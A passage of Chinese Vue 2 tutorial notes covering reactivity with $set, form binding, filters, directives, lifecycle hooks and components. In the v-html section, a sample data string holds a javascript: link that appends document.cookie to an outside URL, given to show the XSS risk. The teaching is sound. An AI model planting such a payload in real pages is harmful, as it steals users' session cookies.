   			this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
   		}
   	}
   }) 
   ```

2. 修改Arr格式的数据

   1）用索引值的方法替换数组值，Vue不会识别

   2）解决方案1：`push()`、`pop()`、`shift()`、`unshift()`、`splice()`、`sort()`、`reverse()`

   3）解决方案2：`vm.$set(arr, index, value)`

3. 使用`$set`更新数据

   1）方法1：`this.$set(target, propertyName/index, value)`

   2）方法2：`Vue.set(target, propertyName/index, value)`，不能给 vm 或 vm._data 添加属性，只能给vm的data中的某一个对象添加属性

   3）方法3：`vm.$set(target, propertyName/index, value)`，不能给 vm 或 vm._data 添加属性，只能给vm的data中的某一个对象添加属性

   ```html
   <div id="root">
     <h1>学生信息</h1>
     <button @click="student.age++">年龄+1岁</button> <br />
     <button @click="addSex">添加性别属性，默认值：男</button> <br />
     <button @click="student.sex = '未知' ">修改性别</button> <br />
     <button @click="addFriend">在列表首位添加一个朋友</button> <br />
     <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br />
     <button @click.once="addHobby">添加一个爱好</button> <br />
     <button @click="updateHobby">修改第一个爱好为：开车</button> <br />
     <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br />
     <h3>姓名：{{student.name}}</h3>
     <h3>年龄：{{student.age}}</h3>
     <h3 v-if="student.sex">性别：{{student.sex}}</h3>
     <h3>爱好：</h3>
     <ul>
       <li v-for="(h,index) in student.hobby" :key="index">{{h}}</li>
     </ul>
     <h3>朋友们：</h3>
     <ul>
       <li v-for="(f,index) in student.friends" :key="index">{{f.name}}--{{f.age}}</li>
     </ul>
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   const vm = new Vue({
     el: '#root',
     data: {
       student: {
         name: 'tom',
         age: 18,
         hobby: ['抽烟', '喝酒', '烫头'],
         friends: [
           { name: 'jerry', age: 35 },
           { name: 'tony', age: 36 },
         ],
       },
     },
     methods: {
       addSex() {
         // Vue.set(this.student,'sex','男')
         this.$set(this.student, 'sex', '男')
       },
       addFriend() {
         this.student.friends.unshift({ name: 'jack', age: 70 })
       },
       updateFirstFriendName() {
         // 用索引值的方法替换数组值，Vue不会识别，但如果用索引修改数组中的对象的属性，Vue可以识别
         this.student.friends[0].name = '张三'
       },
       addHobby() {
         this.student.hobby.push('学习')
       },
       updateHobby() {
         // this.student.hobby.splice(0,1,'开车')
         // Vue.set(this.student.hobby,0,'开车')
         this.$set(this.student.hobby, 0, '开车')
       },
       removeSmoke() {
         this.student.hobby = this.student.hobby.filter((h) => {
           return h !== '抽烟'
         })
       },
     },
   })
   ```

### 1.9 表单数据

#### 1.9.1 input输入框

1. `<input type="text"/>`：v-model收集的是value值，用户输入的就是value值

   ```html
   <input type="text" v-model.trim="userInfo.account" />
   ```

2. `<input type="radio"/>`：v-model收集的是value值，且要给标签配置value值

   ```html
   性别： 男<input type="radio" name="sex" v-model="userInfo.sex" value="male" /> 女<input type="radio" name="sex" v-model="userInfo.sex" value="female" />
   ```

   ```js
   // vue
   sex: 'female',
   ```

3. `<input type="checkbox"/>`：

   1）没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）

   2）配置了input的value属性：

   * v-model的初始值是数组，那么收集的的就是value组成的数组

     ```html
     爱好： 学习<input type="checkbox" v-model="userInfo.hobby" value="study" /> 打游戏<input type="checkbox" v-model="userInfo.hobby" value="game" /> 吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat" />
     ```

     ```js
     // vue
     hobby: [], // 如果是多选框checkbox，要配合数组，否则一勾全勾上了
     ```

   * v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）

     ```html
     <input type="checkbox" v-model="userInfo.agree" />阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
     ```

     ```js
     // vue
     agree: '', // 如果是单选框checkbox，不用配合数组，只收集true、false
     ```

#### 1.9.2 select下拉框

1. 与`option`选项搭配：

   ```html
   <select v-model="userInfo.city">
     <option value="">请选择校区</option>
     <option value="beijing">北京</option>
     <option value="shanghai">上海</option>
     <option value="shenzhen">深圳</option>
     <option value="wuhan">武汉</option>
   </select>
   ```

   ```js
   // Vue
   city: 'beijing',
   ```

2. 案例完整代码

   ```html
   <div id="root">
     <form @submit.prevent="demo">
       <!--收集的是value值，不用配value，因为用户输入的就是value值-->
       账号：<input type="text" v-model.trim="userInfo.account" /> <br /><br />
       密码：<input type="password" v-model="userInfo.password" /> <br /><br />
       年龄：<input type="number" v-model.number="userInfo.age" /> <br /><br />
       <!--收集的是value值，要配value值-->
       性别： 男<input type="radio" name="sex" v-model="userInfo.sex" value="male" /> 女<input type="radio" name="sex" v-model="userInfo.sex" value="female" /> <br /><br />
       <!--配置了value属性，v-model初始值是数组，收集的是数组-->
       爱好： 学习<input type="checkbox" v-model="userInfo.hobby" value="study" /> 打游戏<input type="checkbox" v-model="userInfo.hobby" value="game" /> 吃饭<input type="checkbox" v-model="userInfo.
   hobby" value="eat" /> <br /><br />
       所属校区
       <select v-model="userInfo.city">
         <option value="">请选择校区</option>
         <option value="beijing">北京</option>
         <option value="shanghai">上海</option>
         <option value="shenzhen">深圳</option>
         <option value="wuhan">武汉</option>
       </select>
       <br /><br />
       其他信息：
       <textarea v-model.lazy="userInfo.other"></textarea> <br /><br />
       <!--没有配置value属性，收集的是checked布尔值-->
       <input type="checkbox" v-model="userInfo.agree" />阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
       <button>提交</button>
     </form>
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   new Vue({
     el: '#root',
     data: {
       userInfo: {
         account: '',
         password: '',
         age: 18,
         sex: 'female',
         hobby: [], // 如果是多选框checkbox，要配合数组，否则一勾全勾上了
         city: 'beijing',
         other: '',
         agree: '', // 如果是单选框checkbox，不用配合数组，只收集true、false
       },
     },
     methods: {
       demo() {
         console.log(JSON.stringify(this.userInfo))
       },
     },
   })
   ```


### 1.10 过滤器 Vue.filter

> 对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理），并没有改变原本的数据, 是产生新的对应的数据

#### 1.10.1 注册过滤器

1. 全局过滤器：`Vue.filter(name,callback)`

   ```js
   Vue.filter('mySlice', function (value) {
     return value.slice(0, 4)
   })
   ```

2. 局部过滤器：`new Vue{filters:{...}}`

   ```js
   filters: {
     timeFormater(value, str = 'YYYY年MM月DD日 HH:mm:ss') {
       return dayjs(value).format(str)
     },
   },
   ```

#### 1.10.2 使用过滤器

1. `{{ xxx | 过滤器名}}`

   ```html
   <div id="root2">
     <h2>{{msg | mySlice}}</h2>
   </div>
   <h3>现在是：{{time | timeFormater}}</h3>
   ```

2. `v-bind:属性 = "xxx | 过滤器名"`

   ```html
   <h3 :x="msg | mySlice">尚硅谷</h3>
   ```

3. 过滤器也可以接收额外参数、多个过滤器也可以串联

   ```html
   <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
   ```

4. 完整案例代码

   ```html
   <div id="root">
     <h2>显示格式化后的时间</h2>
     <!-- 计算属性实现 -->
     <h3>现在是：{{fmtTime}}</h3>
     <!-- methods实现 -->
     <h3>现在是：{{getFmtTime()}}</h3>
     <!-- 过滤器实现 -->
     <h3>现在是：{{time | timeFormater}}</h3>
     <!-- 过滤器实现（传参） -->
     <!-- 多个过滤器可以并联 -->
     <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
     <!-- 给标签动态绑定属性，例：绑定属性x，值为'你好，尚' -->
     <h3 :x="msg | mySlice">尚硅谷</h3>
   </div>
   <div id="root2">
     <h2>{{msg | mySlice}}</h2>
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   //全局过滤器
   Vue.filter('mySlice', function (value) {
     return value.slice(0, 4)
   })
   // root1
   new Vue({
     el: '#root',
     data: {
       time: 1621561377603, //时间戳
       msg: '你好，尚硅谷',
     },
     computed: {
       fmtTime() {
         return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
       },
     },
     methods: {
       getFmtTime() {
         return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
       },
     },
     //局部过滤器
     filters: {
       timeFormater(value, str = 'YYYY年MM月DD日 HH:mm:ss') {
         // console.log('@',value)
         return dayjs(value).format(str)
       },
     },
   })
   // root2
   new Vue({
     el: '#root2',
     data: {
       msg: 'hello,atguigu!',
     },
   })
   ```

### 1.11 内置指令 v-xxx

#### 1.11.1 基础指令

1. v-bind: 单向绑定解析表达式，可简写为: xxx
2. v-model: 双向数据绑定
3. v-for: 遍历数组/对象/字符串
4. v-on: 绑定事件监听，可简写为@
5. v-if: 条件渲染（动态控制节点是否存存在）
6. v-else: 条件渲染（动态控制节点是否存存在）
7. v-show: 条件渲染(动态控制节点是否展示)

#### 1.11.2 v-text

1. 作用：向其所在的节点中渲染文本内容

2. 区别：v-text会替换掉节点中的内容，{{xxx}}则不会

3. 注意：文字中的html标签不会被解析，而是直接显示

   ```html
   <div id="root">
     <div>你好，{{name}}</div>
     <div v-text="name">我被替换了</div>
     <div v-text="str"></div>
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   new Vue({
     el: '#root',
     data: {
       name: '尚硅谷',
       str: '<h3>你好啊！</h3>', // 这里<h3>不会被当成html标签解析，而是直接显示出来
     },
   })
   ```

#### 1.11.3 v-html

1. 作用：向指定节点中渲染包含html结构的内容

2. 区别：

   1）v-html会替换掉节点中所有的内容，{{xxx}}则不会

   2）v-html可以识别html结构

3. 注意：

   1）v-html有安全性问题

   2）在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击

   3）一定要在可信的内容上使用v-html，永不要用在用户提交的内容上

   ```html
   <div id="root">
     <div>你好，{{name}}</div>
     <div v-html="str"></div>
     <div v-html="str2"></div>
   </div>
   ```

   ```js
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
   new Vue({
     el: '#root',
     data: {
       name: '尚硅谷',
       str: '<h3>你好啊！</h3>',
       // 可用 document.cookie 获取当前网站的 cookie，但如果标记了 HttpOnly 则无法读取
       str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
     },
   })
   ```

#### 1.11.4 v-cloak

1. 定义：本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性

2. 作用：使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题

3. 效果：如果需要vue加载的资源速度很慢，可以加上此属性，等vue加载完成后再显示，不然直接显示模板符号很丑

   ```html
   <div id="root">
     <h2 v-cloak>{{name}}</h2>
   </div>
   <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
   ```

   ```js
   console.log(1)
   Vue.config.productionTip = false
   new Vue({
     el: '#root',
     data: {
       name: '尚硅谷',
     },
   })
   ```

#### 1.11.5 v-once

1. 定义：v-once所在节点在初次动态渲染后，就视为静态内容了

2. 作用：以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

   ```html
   <div id="root">
     <h2 v-once>初始化的n值是:{{n}}</h2>
     <h2>当前的n值是:{{n}}</h2>
     <button @click="n++">点我n+1</button>
   </div>
   ```

   ```js
    Vue.config.productionTip = false
    new Vue({
      el: '#root',
      data: {
        n: 1,
      },
    })
   ```

#### 1.11.6 v-pre

1. 定义：跳过其所在节点的编译过程

2. 作用：没有使用指令语法、没有使用插值语法的节点，会加快编译

   ```html
   <div id="root">
     <h2 v-pre>Vue其实很简单</h2>
     <h2>当前的n值是:{{n}}</h2>
     <button @click="n++">点我n+1</button>
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   new Vue({
     el: '#root',
     data: {
       n: 1,
     },
   })
   ```

### 1.12 自定义指令 directives

1. 局部指令：

   1）`new Vue({directives:{指令名: 回调函数}}) `

   2）`new Vue({directives:{指令名: 配置对象}})`

   ```html
   <div id="root">
     <h2>{{name}}</h2>
     <h2>当前的n值是：<span v-text="n"></span></h2>
     <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
     <h2>放大10倍后的n值是：<span v-big="n"></span></h2>
     <button @click="n++">点我n+1</button>
     <hr />
     <input type="text" v-fbind:value="n" />
   </div>
   ```

   ```js
   Vue.config.productionTip = false
   new Vue({
     el: '#root',
     data: {
       name: '尚硅谷',
       n: 1,
     },
     // 自定义指令：局部指令
     directives: {
       big(element, binding) {
         console.log('big', this) //注意此处的this是window
         element.innerText = binding.value * 10
       },
       
       // 对象式
       fbind: {
         //指令与元素成功绑定时（一上来）
         bind(element, binding) {
           element.value = binding.value
         },
         //指令所在元素被插入页面时
         inserted(element, binding) {
           element.focus()
         },
         //指令所在的模板被重新解析时
         update(element, binding) {
           element.value = binding.value
         },
       },
     },
   })
   ```

2. 全局指令：

   1）`Vue.directive(指令名, 回调函数)`

   2）`Vue.directive(指令名, 配置对象)`

   ```js
   //定义全局指令
   Vue.directive('big', function (element, binding) {
     console.log('big', this)
     element.innerText = binding.value * 10
   })
   
   Vue.directive('fbind', {
     //指令与元素成功绑定时（一上来）
     bind(element, binding) {
       element.value = binding.value
     },
     //指令所在元素被插入页面时
     inserted(element, binding) {
       element.focus()
     },
     //指令所在的模板被重新解析时
     update(element, binding) {
       element.value = binding.value
     },
   })
   ```

3. 回调：

   1）`bind`：指令与元素成功绑定时调用

   2）`inserted`：指令所在元素被插入页面时调用

   3）`update`：指令所在模板结构被重新解析时调用

   4）参数：

   * `element`：指令所在的DOM元素
   * `binding`：绑定对象，内部包含很多属性，最重要的是value，代表自定义方法绑定的值

4. 注意：

   1）指令定义时不加`v-`，但使用时要加`v-`

   2）指令名如果是多个单词，要使用`kebab-case`命名方式，不要用camelCase命名，且要加单引号

   ```js
   'big-number'(element,binding){
   	element.innerText = binding.value * 10
   },
   ```

### 1.13 生命周期函数

> 生命周期回调函数、生命周期函数、生命周期钩子，Vue在关键时刻调用的一些特殊名称的函数。

![生命周期](./src/生命周期.png)

1. `beforeCreate()`：无法通过vm访问到data数据、method中的方法

2. `created()`：可以通过vm访问到data数据、method中的方法

3. `beforeMounted()`：页面呈现的是未经Vue编译的DOM结构，所有对DOM的操作都不奏效

4. `mounted()`：Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted

   1）等价写法：`vm.$mount('#root')`

   2）页面呈现经过Vue编译的DOM，对DOM的操作有效

   3）适用：开启定时器、发送ajax请求、订阅消息、绑定自定义事件

5. `beforeUpdate()`：此时数据是新的，但页面是旧的，页面尚未与数据保持一致

6. `updated()`：此时数据、页面都是新的，两者保持同步

7. `beforeDestroy()`：vm中所有的data、methods、指令等都处于可用状态，马上要执行销毁过程

   1）适用：关闭定时器、取消订阅消息、解绑自定义事件

   2）注意：此时不要调用method中的方法了

8. `destroyed()`：销毁后借助Vue开发者工具看不到任何信息

   1）等价写法：vm.$destroy()

   2）销毁后自定义事件会失效，但原生DOM事件依然有效

   3）一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了

9. 注意：

   1）生命周期函数中的this指向是 vm 或 组件实例对象vc

   2）生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的

   ```html
   <div id="root" :x="n">
     <!-- 这里面的内容也可以用template生成，但是会忽略上面的div中的所有属性，改成template里写的属性 -->
     <h2 v-text="n"></h2>
     <h2>当前的n值是：{{n}}</h2>
     <button @click="add">点我n+1</button>
     <button @click="bye">点我销毁vm</button>
     <hr />
     <img src="./src/生命周期.png" height="1000px" />
   </div>
   ```

   ```js
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
   new Vue({
     el: '#root',
     // template: `
     // 	<div id="root" :x="n">
     // 		<h2>当前的n值是：{{n}}</h2>
     // 		<button @click="add">点我n+1</button>
     // 		<button @click="bye">点我销毁vm</button>
     // 	</div>
     // `,
     data: {
       n: 1,
     },
     methods: {
       add() {
         console.log('add')
         this.n++
       },
       bye() {
         console.log('bye')
         this.$destroy()
       },
     },
     watch: {
       n() {
         console.log('n变了')
       },
     },
     // 创建流程 -------------------------------
     beforeCreate() {
       console.log('beforeCreate')
     },
     created() {
       console.log('created')
     },
     // 挂载流程 -------------------------------
     beforeMount() {
       console.log('beforeMount')
       // console.log(this) // 指向Vue
       // debugger // 打断点，需要打开控制台后刷新才能卡断点
     },
     mounted() {
       // 等价写法：vm.$mount('#root')
       console.log('mounted', this.$el instanceof HTMLElement) // 判断此时是不是真是的DOM元素
     },
     // 更新流程 -------------------------------
     beforeUpdate() {
       console.log('beforeUpdate')
     },
     updated() {
       console.log('updated')
     },
     // 销毁流程 -------------------------------
     beforeDestroy() {
       console.log('beforeDestroy')
       // 在这里不要调用methods中的方法了
     },
     destroyed() {
       // 等价写法：vm.$destroy()
       console.log('destroyed')
     },
   })
   ```

10. 技巧：可以在生命周期函数中写debugger用于打断点，需要打开控制台后刷新生效

    ```js
    beforeMount() {
      console.log('beforeMount')
      // console.log(this) // 指向Vue
      debugger // 打断点，需要打开控制台后刷新才能卡断点
    },
    ```

11. 演示案例

    ```html
    <div id="root">
      <h2 :style="{opacity}">欢迎学习Vue</h2>
      <button @click="opacity = 1">透明度设置为1</button>
      <button @click="stop">点我停止变换</button>
    </div>
    ```

    ```js
    Vue.config.productionTip = false
    new Vue({
      el: '#root',
      data: {
        opacity: 1,
      },
      methods: {
        stop() {
          this.$destroy()
        },
      },
      //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
      mounted() {
        console.log('mounted', this)
        this.timer = setInterval(() => {
          console.log('setInterval')
          this.opacity -= 0.01
          if (this.opacity <= 0) this.opacity = 1
        }, 16)
      },
      beforeDestroy() {
        clearInterval(this.timer)
        console.log('vm即将驾鹤西游了')
      },
    })
    ```

### 1.14 组件 VueComponent

#### 1.14.1 非单文件组件

##### 1.14.1.1 定义组件(创建组件)

1. 语法：

   1）完整版：`const 组件名 = Vue.extend(options)`

   2）简写版：`const 组件名 = options`

2. 参数：

   1）`el`：不写，最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器

   2）`data`：必须写成函数，避免组件被复用时，数据存在引用关系

3. 组件命名规则：

   1）一个单词：

   * 第一种写法(首字母小写)：school
   * 第二种写法(首字母大写)：School

   2）多个单词：

   * 第一种写法(`kebab-case`命名)：my-school
   * 第二种写法(`CamelCase`命名)：MySchool (需要Vue脚手架支持)

   3）注意：

   * 组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行
   * 可以使用name配置项指定组件在开发者工具中呈现的名字

   ```html
   <div id="root">
     <h1>{{msg}}</h1>
     <school></school>
   </div>
   ```
   
   ```js
   // 定义组件：完整写法
   const s = Vue.extend({
      name: 'atguigu', // 如果定义了name，在Vue开发工具里面就永远叫这个名字，但页面标签不是这个名
      template: `
   	 <div>
   		<h2>学校名称：{{name}}</h2>
   		<h2>学校地址：{{address}}</h2>
   	 </div>
   `,
      data() {
        return {
          name: '尚硅谷',
          address: '北京',
        }
      },
    })
   
   new Vue({
     el: '#root',
     data: {
       msg: '欢迎学习Vue!',
     },
     components: {
       // 定义组件绑定的标签名称
       school: s, // 这步Vue会自动绑定Vue.extend(options)
     },
   })
   ```
   
   ```js
   // 定义组件：简写形式
   const s = {
     name: 'atguigu', // 如果定义了name，在Vue开发工具里面就永远叫这个名字，但页面标签不是这个名
     template: `
   	<div>
   	   <h2>学校名称：{{name}}</h2>
   	   <h2>学校地址：{{address}}</h2>
   	</div>
   `,
     data() {
       return {
         name: '尚硅谷',
         address: '北京',
       }
     },
   }
   
   new Vue({
     el: '#root',
     data: {
       msg: '欢迎学习Vue!',
     },
     components: {
       // 定义组件绑定的标签名称
       school: s, // 这步Vue会自动绑定Vue.extend(options)
     },
   })
   ```


##### 1.14.1.2 注册组件

1. 局部注册：new Vue时传入components选项

2. 全局注册：`Vue.component('组件名',组件)`

3. 注意：可以分别指定标签和组件名称，`components: { 标签名：组件名 }`

   ```html
   <div id="root">
     <hello></hello>
     <hr />
     <h1>{{msg}}</h1>
     <hr />
     <!-- 编写组件标签 -->
     <school></school>
     <hr />
     <!-- 编写组件标签 -->
     <student></student>
   </div>
   <div id="root2">
     <hello></hello>
     <!-- 由于student组件是在root中局部注册的，在root2中无效 -->
     <student></student>
   </div>
   ```

   ```js
   // 创建student组件
   const student = Vue.extend({
     template: `
   		<div>
   			<h2>学生姓名：{{studentName}}</h2>
   			<h2>学生年龄：{{age}}</h2>
   		</div>
   	`,
     data() {
       return {
         studentName: '张三',
         age: 18,
       }
     },
   })
   // 创建hello组件
   const hello = Vue.extend({
     template: `
   		<div>	
   			<h2>你好啊！{{name}}</h2>
   		</div>
   	`,
     data() {
       return {
         name: 'Tom',
       }
     },
   })
   
   // 全局注册组件
   Vue.component('hello', hello)
   
   // 创建vm
   new Vue({
     el: '#root',
     data: {
       msg: '你好啊！',
     },
     // 局部注册组件
     components: {
       school,
       student,
     },
   })
   new Vue({
     el: '#root2',
   })
   ```

##### 1.14.1.3 使用组件(写组件标签)

1. 写法1：`<school></school>`
2. 写法2：`<school/>`，但不用使用脚手架时，`<school/>`会导致后续组件不能渲染

##### 1.14.1.4 组件嵌套

* 可以在下一个组件定义时使用已经定义好的组件

  ```html
  <div id="root"></div>
  ```

  ```js
  Vue.config.productionTip = false
  // 定义student组件
  const student = Vue.extend({
    name: 'student',
    template: `
  		<div>
  			<h2>学生姓名：{{name}}</h2>	
  			<h2>学生年龄：{{age}}</h2>	
  		</div>
  	`,
    data() {
      return {
        name: '尚硅谷',
        age: 18,
      }
    },
  })
  
  //定义school组件
  const school = Vue.extend({
    name: 'school',
    template: `
  		<div>
  			<h2>学校名称：{{name}}</h2>	
  			<h2>学校地址：{{address}}</h2>	
  			<student></student>
  		</div>
  	`,
    data() {
      return {
        name: '尚硅谷',
        address: '北京',
      }
    },
    // 注册组件（局部）：由于在template中使用了student，必须注册
    components: {
      student,
    },
  })
  
  //定义hello组件
  const hello = Vue.extend({
    template: `<h1>{{msg}}</h1>`,
    data() {
      return {
        msg: '欢迎来到尚硅谷学习！',
      }
    },
  })
  
  //定义app组件
  const app = Vue.extend({
    template: `
  		<div>	
  			<hello></hello>
  			<school></school>
  		</div>
  	`,
    // 注册组件（局部）：由于在template中使用了student、hello，必须注册
    components: {
      school,
      hello,
    },
  })
  
  // 创建vm
  new Vue({
    template: '<app></app>',
    el: '#root',
    // 注册组件（局部）：由于嵌套组件已经相互在内部注册，直接注册最终的app即可
    components: { app },
  })
  ```

##### 1.14.1.5 组件的本质

1. 组件本质是一个名为`VueComponent`的构造函数，且不是程序员定义的，是`Vue.extend`生成的

2. 只需要写组件标签，Vue解析时会帮我们创建school组件的实例对象：`new VueComponent(options)`

3. 每次调用`Vue.extend`，返回的都是一个全新的`VueComponent`

4. this指向（data函数、methods中的函数、watch中的函数、computed中的函数）

   1）组件配置：指向`VueComponent`实例对象`vc`

   2）`new Vue(options)`配置：指向Vue实例对象`vm`

5. 内置关系：`VueComponent.prototype.__proto__` === `Vue.prototype`
   * 作用：让组件实例对象 vc 可以访问到 Vue原型上的属性、方法
   
   ```html
   <div id="root">
     <school></school>
   </div>
   ```
   ```js
   Vue.config.productionTip = false
   // 在Vue上定义x属性
   Vue.prototype.x = 99
   //定义school组件
   const school = Vue.extend({
     name: 'school',
     template: `
   		<div>
   			<h2>学校名称：{{name}}</h2>	
   			<h2>学校地址：{{address}}</h2>	
   			<button @click="showX">点我输出x</button>
   		</div>
   	`,
     data() {
       return {
         name: '尚硅谷',
         address: '北京',
       }
     },
     methods: {
       showX() {
         // 访问x属性
         console.log(this.x)
       },
     },
   })
   //创建一个vm
   const vm = new Vue({
     el: '#root',
     data: {
       msg: '你好',
     },
     components: { school },
   })
   ```

#### 1.14.2 单文件组件

##### 1.14.2.1 组件结构

1. HTML标签：`<template></template>`
2. Vue.js代码：`<script> export default {...} </script>`
3. CSS样式：`<style></style>`

##### 1.14.2.2 整体结构

1. 组件：

   1）School.vue

   ```vue
   <template>
     <div class="demo">
       <h2>学校名称：{{ name }}</h2>
       <h2>学校地址：{{ address }}</h2>
       <button @click="showName">点我提示学校名</button>
     </div>
   </template>
   
   <script>
   export default {
     name: 'School', // Vue开发者工具中显示的名称，最好和文件名保持一致
     data() {
       return {
         name: '尚硅谷',
         address: '北京昌平',
       }
     },
     methods: {
       showName() {
         alert(this.name)
       },
     },
   }
   </script>
   
   <style>
   .demo {
     background-color: orange;
   }
   </style>
   ```

   2）Student.vue

   ```vue
   <template>
   	<div>
   		<h2>学生姓名：{{name}}</h2>
   		<h2>学生年龄：{{age}}</h2>
   	</div>
   </template>
   
   <script>
   	 export default {
   		name:'Student',
   		data(){
   			return {
   				name:'张三',
   				age:18
   			}
   		}
   	}
   </script>
   ```

2. 入口：

   1）App.vue

   ```vue
   <template>
     <div>
       <School></School>
       <Student></Student>
     </div>
   </template>
   
   <script>
   //引入组件
   import School from './School.vue'
   import Student from './Student.vue'
   
   export default {
     name: 'App',
     components: {
       School,
       Student
     }
   }
   </script>
   ```

   2）main.js

   ```js
   import App from './App.vue'	// 浏览器不支持此语法，需要搭建cil脚手架
   
   new Vue({
     el: '#root',
     template: `<App></App>`,
     components: { App },
   })
   ```

   3）index.html：不能直接运行，这是因为浏览器不支持main.js的模块化语法，需要搭建脚手架执行

   ```html
   <!DOCTYPE html>
   <html>
     <head>
       <meta charset="UTF-8" />
       <title>练习一下单文件组件的语法</title>
     </head>
     <body>
       <!-- 准备一个容器 -->
       <div id="root"></div>
       <script type="text/javascript" src="../js/vue.js"></script>
       <script type="text/javascript" src="./main.js"></script>
     </body>
   </html>
   ```

------

## 第2章 Vue-CLI

